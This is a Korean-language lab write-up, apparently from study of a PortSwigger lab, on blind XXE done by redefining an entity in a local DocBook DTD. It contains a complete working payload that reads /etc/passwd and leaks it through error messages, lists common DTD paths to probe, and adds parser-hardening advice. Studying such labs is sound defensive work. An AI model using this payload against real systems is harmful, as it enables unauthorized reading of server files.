# Lab: Exploiting XXE to inject through a local DTD

## 개요

- **난이도**: Expert
- **주제**: Blind XXE — 로컬 DTD 재활용 / 엔티티 재정의 / 외부 서버 없는 에러 기반 탈취
- **링크**: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

## 목표

아웃바운드 HTTP 가 차단되어 외부 DTD 호스팅이 불가한 환경에서, 서버에 이미 존재하는 로컬 DTD 파일(DocBook)을 재활용한다. 로컬 DTD 가 참조하는 엔티티를 내부 DTD 에서 악성 내용으로 재정의하면, 로컬 DTD 처리 컨텍스트(외부 DTD 제약 없음)에서 파라미터 엔티티 체인이 실행되어 에러 메시지로 파일 내용이 노출된다.

## 005~006 랩과의 차이

```
[005~006 랩 — 공격자 서버 외부 DTD]
  %xxe; → http://exploit-server.net/evil.dtd 로드
  필요: 타겟에서 아웃바운드 HTTP 가능
  차단 시: 외부 DTD 로드 불가 → 공격 불가

[009 랩 (이번) — 로컬 DTD 재활용]
  %xxe; → file:///usr/share/yelp/dtd/docbookx.dtd 로드
  필요: 서버에 알려진 DTD 파일 존재
  차단 없음: file:// 는 네트워크 불필요
  → 완전한 아웃바운드 차단 환경에서도 동작
```

## 핵심 원리 — 엔티티 재정의 (Entity Redefinition)

### XML 엔티티 우선순위 규칙

```
XML 스펙:
  동일한 엔티티가 내부 DTD 와 외부 DTD 양쪽에 정의되면
  → 내부 DTD 의 정의가 우선 적용

활용:
  로컬 DTD(외부 DTD) 가 %ISOamso; 를 정의하고 사용
  → 내부 DTD 에서 %ISOamso; 를 악성 내용으로 재정의
  → 로컬 DTD 로드 시 재정의된 버전이 실행
```

### 왜 외부 DTD 컨텍스트가 필요한가

```
내부 DTD 제약 (005 랩에서 학습):
  파라미터 엔티티를 다른 엔티티 선언 안에서 참조 불가
  → %file; 이 %eval; 선언 안에서 평가 안 됨
  → 에러 기반 탈취 불가

외부 DTD 컨텍스트:
  파라미터 엔티티 중첩 제약 없음
  → %file; → %eval; → %error; 체인 정상 동작

로컬 DTD 재활용의 의미:
  내부 DTD 에서 엔티티 재정의 (우선순위 확보)
  로컬 DTD 로드 → 로컬 DTD 가 재정의된 엔티티 호출
  → 호출 시점: 외부 DTD(로컬 DTD) 컨텍스트
  → 파라미터 엔티티 중첩 제약 없음
  → 에러 기반 체인 정상 실행
```

## DocBook DTD

```
DocBook:
  기술 문서 작성용 XML 스키마/DTD
  리눅스 배포판에 기본 설치된 경우 많음

일반적인 경로:
  /usr/share/yelp/dtd/docbookx.dtd
  /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
  /usr/share/sgml/docbook/sgml-dtd-3.1/docbookx.dtd
  /usr/share/sgml/docbook/sgml-dtd-4.1-1.0-30.1.noarch/docbookx.dtd

docbookx.dtd 내부 구조:
  ...
  <!ENTITY % ISOamso PUBLIC
    "ISO 8879:1986//ENTITIES Added Math Symbols//EN//XML"
    "ISOamso.ent">
  %ISOamso;   ← 이 엔티티를 내부 DTD 에서 재정의
  ...

재정의 대상:
  docbookx.dtd 가 호출하는 엔티티 중 하나를 선택
  → 재정의하면 로컬 DTD 처리 시 악성 코드 실행
```

## 공격 방법

### 페이로드

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "
      <!ENTITY &#x26;#x25; error
        SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>
    ">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 각 부분 분석

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  → 로컬 DTD 를 파라미터 엔티티로 정의
  → file:// 사용 → 네트워크 불필요

<!ENTITY % ISOamso '...'>
  → docbookx.dtd 가 사용하는 ISOamso 엔티티를 재정의
  → 내부 DTD 에서 정의 → 우선순위 확보
  → 값: 에러 기반 탈취 체인 (문자열로 감쌈)

  내부 체인:
    &#x25; → %  (DTD 문자열 내 % 리터럴 표현, 005~006 랩과 동일)
    &#x26;#x25; → &#x25; → % (이중 인코딩: 중첩 문자열 안에서)
    &#x27; → '  (작은따옴표 인코딩)

%local_dtd;
  → docbookx.dtd 로드 및 처리
  → DTD 처리 중 %ISOamso; 호출
  → 재정의된 악성 버전 실행 (외부 DTD 컨텍스트)
  → %file; → %eval; → %error; 체인 실행
  → file:///nonexistent/<passwd 내용> 로드 시도
  → 에러: 파일 없음 + 경로에 파일 내용 포함
  → HTTP 응답 에러 메시지에서 확인
```

### 인코딩 중첩 분석

```
문자열 레이어가 중첩될수록 인코딩이 추가됨:

[1레이어 — 외부 문자열]
  DOCTYPE 블록 내 직접 선언
  % → &#x25;

[2레이어 — ISOamso 엔티티 값 문자열 안]
  ' ... ' 로 감싼 문자열 내부
  % → &#x25;  (동일)
  & → &#x26;  (한 레이어 추가)

[3레이어 — eval 엔티티 값 문자열 안에서 error 선언]
  " ... " 안의 또 다른 선언
  % → &#x26;#x25;  (& 를 &#x26; 로, 전체: &#x26;#x25;)
  ' → &#x27;

실제 평가 시:
  &#x26;#x25; → &#x25; → %
  &#x27; → '
```

## 로컬 DTD 존재 확인 방법

```
파일이 존재하면: DTD 처리 → 에러 메시지 발생
파일이 없으면: DTD 로드 실패 → 다른 에러

시도 순서:
  1. /usr/share/yelp/dtd/docbookx.dtd
  2. /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
  3. /etc/xml/catalog  (XML 카탈로그)
  4. /usr/share/sgml/docbook/...

OS 별 흔한 로컬 DTD:
  Ubuntu/Debian: /usr/share/yelp/dtd/docbookx.dtd
  RHEL/CentOS:   /usr/share/sgml/docbook/...
  Windows:       C:\Windows\System32\dtd\ (드물게 존재)
```

## 방어 관점

```
[근본 방어 — XML 파서 설정]
  DOCTYPE 처리 자체 비활성화:
    → 로컬 DTD 로드도 불가
    → file:// 참조도 차단

  Java:
    factory.setFeature(
      "http://apache.org/xml/features/disallow-doctype-decl", true
    );

[보조 방어 — 불필요한 패키지 제거]
  DocBook, Yelp 등 문서화 도구 미설치
  → 재활용할 로컬 DTD 파일 자체가 없음
  → 공격 성립 조건 제거

[아웃바운드 차단만으로는 불충분]
  이번 랩이 증명:
  file:// 로 로컬 DTD 재활용 → 아웃바운드 불필요
  → 네트워크 차단 + 파서 설정 필수
```

## 핵심 정리

- 아웃바운드 HTTP 가 차단된 환경에서도 서버 내 로컬 DTD 파일(DocBook 등)을 `file://` 로 로드해 파라미터 엔티티 체인을 실행할 수 있다.
- 로컬 DTD 가 참조하는 엔티티(`ISOamso`)를 내부 DTD 에서 악성 내용으로 재정의하면, 로컬 DTD 처리 컨텍스트(외부 DTD 제약 없음)에서 파라미터 엔티티 중첩이 동작한다.
- 중첩 문자열 레이어마다 `%` 와 `&` 의 인코딩(`&#x25;`, `&#x26;#x25;`)이 추가된다.
- 방어는 DOCTYPE 처리 자체를 비활성화하는 것이 유일한 근본 해결책이며, 네트워크 아웃바운드 차단만으로는 불충분하다.

## 배운 점 및 추가 학습

### 1. 005~006 vs 009 랩 비교

| 항목 | 005 (외부 DTD OOB) | 006 (외부 DTD 에러) | 009 (로컬 DTD 에러) |
|------|-------------------|--------------------|--------------------|
| DTD 위치 | 공격자 서버 | 공격자 서버 | 서버 로컬 |
| 아웃바운드 | 필요 | 필요 | 불필요 |
| 에러 반영 | 불필요 | 필요 | 필요 |
| 로컬 DTD | 불필요 | 불필요 | 필요 |
| 공격 조건 | 아웃바운드 O | 아웃바운드 O + 에러 O | 로컬 DTD O + 에러 O |

### 2. 전체 Blind XXE 환경별 선택 가이드

```
아웃바운드 O, 에러 반영 X:
  → 005 (외부 DTD + OOB HTTP 탈취)

아웃바운드 O, 에러 반영 O:
  → 005 또는 006 모두 가능

아웃바운드 X, 에러 반영 O, 로컬 DTD O:
  → 009 (로컬 DTD 재활용)

아웃바운드 X, 에러 반영 X:
  → 현재까지 학습한 기법으로 탈취 불가
  → 타이밍 기반 등 고급 기법 필요
```

### 3. 001~009 XXE 전체 공격 패턴 종합

| 랩 | 진입점 | 기법 | 아웃바운드 | 에러 반영 | 로컬 DTD |
|----|--------|------|-----------|---------|---------|
| 001 | XML 요청 | ENTITY 파일 읽기 | X | X | X |
| 002 | XML 요청 | ENTITY SSRF | X | X | X |
| 003 | XML 요청 | 일반 엔티티 OOB | O | X | X |
| 004 | XML 요청 | 파라미터 엔티티 OOB | O | X | X |
| 005 | XML 요청 | 외부 DTD OOB | O | X | X |
| 006 | XML 요청 | 외부 DTD 에러 | O | O | X |
| 007 | 폼 파라미터 | XInclude | X | X | X |
| 008 | 파일 업로드 | SVG XXE | X | X | X |
| 009 | XML 요청 | 로컬 DTD 재활용 | X | O | O |
